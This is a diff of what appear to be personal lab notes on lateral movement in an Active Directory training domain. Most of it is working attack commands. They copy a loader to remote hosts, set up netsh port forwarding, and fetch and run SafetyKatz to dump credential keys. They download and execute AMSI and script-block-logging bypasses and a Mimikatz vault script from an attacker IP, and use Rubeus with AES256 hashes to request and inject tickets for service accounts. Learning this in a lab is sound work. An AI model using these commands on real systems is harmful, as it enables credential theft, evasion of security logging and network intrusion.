@@ -40,22 +40,22 @@ $null | winrs -r:dcorp-mgmt "powershell /c Get-Process -IncludeUserName"
 ### Lateral 1 (Local Admin)
 Add port forward to machine to forwards to webserver - downloading executable is bad
 ```powershell
-echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mssql.dollarcorp.moneycorp.LOCAL\C$\Users\Public\Loader.exe
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 
-$null | winrs -r:dcorp-mssql.dollarcorp.moneycorp.LOCAL "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
 ```
 
 Download from local loopback
 ```powershell
-$null | winrs -r:dcorp-mssql.dollarcorp.moneycorp.LOCAL "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args sekurlsa::evasive-keys exit"
+$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args sekurlsa::evasive-keys exit"
 
-$null | winrs -r:dcorp-mssql.dollarcorp.moneycorp.LOCAL powershell -c "iex (iwr http://172.16.100.48/sbloggingbypass.txt -useb);iex (iwr http://172.16.100.48/amsibypass.txt -useb);iex (iwr http://172.16.100.48/Invoke-MimiEx-vault.ps1 -useb);"
+$null | winrs -r:dcorp-mgmt powershell -c "iex (iwr http://172.16.100.48/sbloggingbypass.txt -useb);iex (iwr http://172.16.100.48/amsibypass.txt -useb);iex (iwr http://172.16.100.48/Invoke-MimiEx-vault.ps1 -useb);"
 ```
 
 Note down the `aes256_hmac` and the cleartext credentials 
 Use Rubues on attacking machine
 ```powershell
-C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
 This will create a logon type 9 so the new credentials will only be used when accessing domain resources
@@ -67,7 +67,7 @@ A:\tools\InviShell\RunWithRegistryNonAdmin.bat
 ```
 
 ```powershell
-cd C:\Users\Public; Import-Module .\PowerView.ps1, .\PowerHuntShares.psm1, .\Find-PSRemotingLocalAdminAccess.ps1, .\PowerUp.ps1
+cd C:\Users\Public; Import-Module .\PowerView.ps1, .\PowerHuntShares.psm1, .\Find-PSRemotingLocalAdminAccess.ps1, .\PowerUp.ps1, .\Invoke-SessionHunter.ps1
 ```
 
 You must have administrator access to list sessions - netexec equivalent
